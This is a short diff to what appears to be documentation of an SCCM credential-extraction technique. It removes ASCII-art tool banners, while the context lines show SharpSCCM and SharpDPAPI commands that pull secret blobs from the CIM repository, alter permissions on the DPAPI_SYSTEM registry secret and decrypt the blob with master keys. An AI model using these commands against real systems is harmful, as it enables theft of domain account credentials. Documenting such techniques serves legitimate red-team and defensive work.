@@ -43,10 +43,6 @@ Currently-configured NAAs and/or legacy NAA configurations may be present in the
 ```
 PS C:\tools\> .\SharpSCCM.exe local secrets -m disk
 
-  _______ _     _ _______  ______  _____  _______ _______ _______ _______
-  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |    v2.0.1.0
-  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |    @_Mayyhem
-
 [+] Retrieving secret blobs from CIM repository
 
 [+] Modifying permissions on registry key: SECURITY\Policy\Secrets\DPAPI_SYSTEM\CurrVal\
@@ -89,13 +85,6 @@ PS C:\Users\labadmin\Desktop> $str = "0601000001000000D08C9DDF0115D1118C7A00C04F
 PS C:\Users\labadmin\Desktop> $bytes = for($i=0; $i -lt $str.Length; $i++) {[byte]::Parse($str.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber); $i++}
 PS C:\Users\labadmin\Desktop> $b64 = [Convert]::ToBase64String($bytes[4..$bytes.Length])
 PS C:\Users\labadmin\Desktop> .\SharpDPAPI.exe blob /target:$b64 /mkfile:masterkeys.txt
-
-  __                 _   _       _ ___
- (_  |_   _. ._ ._  | \ |_) /\  |_) |
- __) | | (_| |  |_) |_/ |  /--\ |  _|_
-                |
-  v1.12.0
-
 
 [*] Action: Describe DPAPI blob
 
